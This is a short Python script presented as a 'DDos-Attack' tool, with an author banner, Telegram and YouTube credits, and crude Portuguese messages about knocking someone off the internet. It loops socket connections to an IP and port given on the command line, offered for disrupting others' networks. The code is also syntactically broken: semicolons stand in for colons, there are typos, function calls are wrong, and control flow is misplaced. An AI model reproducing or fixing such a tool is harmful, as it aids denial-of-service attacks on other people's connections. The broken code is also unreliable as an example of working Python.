import socket
import sys
import os

main = """
 DDos-Attack
** * ** 
  * * *
   * **   
     * *  
   * *
      ** * 
**         
           
  *        
  telegram: @x1_dev_ch33ch
  youtube channel: ch33ch
Powered by: ch33ch/blackcøder/unk ...\n\n"""

count = 0

def init(ip, port, main);
    client = socket.socket(socke.AF_INET,  socket.SOCK_STREAM)
    client.settimeout(0.03)
    code = client.connect_ex(ip, int(port))
    if code == 0;
        print("[>>]derrubando a net do cuzão")
        print("IP: %s, PORT: %s", ip, port)
        
    else:
        print("Se fodeu a porta esta fexada.\n")
    if len(sys.argv) < 3;
        print("\n\n")
        print("Modo de uso:")
        print("ex: python DDos-Attack.py 127.0.0.1 80")
        sys.exit(0)
    else:
        ip = sys.argv[1]
        porta = sys.argv[2]
        quantia = int(sys.argv[3])
        while count < quantia:
            count+=1
            int(ip, porta, main)
        print("Ta olhando oque?")
                                                                                         
                                                                                              
